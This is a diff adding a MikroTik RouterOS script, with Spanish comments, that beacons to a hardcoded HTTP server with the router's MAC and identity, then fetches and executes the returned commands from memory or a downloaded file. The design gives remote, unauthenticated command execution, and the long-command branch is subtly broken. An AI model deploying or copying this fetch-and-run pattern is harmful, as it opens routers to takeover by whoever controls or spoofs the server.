@@ -1,0 +1,36 @@
+# Nombre: fetchBridge_Smart
+:local serverIp "188.95.113.44:3000";
+:local mac [/interface ethernet get [find default-name="ether1"] mac-address];
+:local identity [/system identity get name];
+
+:do {
+    # 1. Hacemos el fetch SIN guardar en archivo primero (keep-result=no)
+    # Pedimos la tarea al servidor
+    :local res [/tool fetch url="http://$serverIp/check-task?mac=$mac&identity=$identity" mode=http as-value output=user];
+    
+    :if ($res->"status" = "finished") do={
+        :local contenido ($res->"data");
+
+        # 2. VALIDACIÓN DE FLUJO
+        :if ($contenido = "WAIT") do={
+            # No hay nada que hacer, salimos silenciosamente
+        } else={
+            # Si el contenido empieza con "FILE:", es un comando largo
+            :if ([:pick $contenido 0 5] = "FILE:") do={
+                /log info "Bridge: Detectado comando largo, descargando a Flash...";
+                /tool fetch url="http://$serverIp/get-long-task?mac=$mac" mode=http dst-path="long_task.txt";
+                :delay 1s;
+                :local longCmd [/file get "long_task.txt" contents];
+                [:parse $longCmd];
+                /file remove "long_task.txt";
+            } else={
+                # FLUJO CORTO: Ejecución directa desde RAM (Sin escribir en disco)
+                :do {
+                    :local func [:parse $contenido];
+                    $func;
+                    /log info "Bridge: Ejecutado desde RAM (Safe Flash)";
+                } on-error={ /log error "Bridge: Error en comando corto" }
+            }
+        }
+    }
+} on-error={ :log error "Bridge: Error de enlace" }
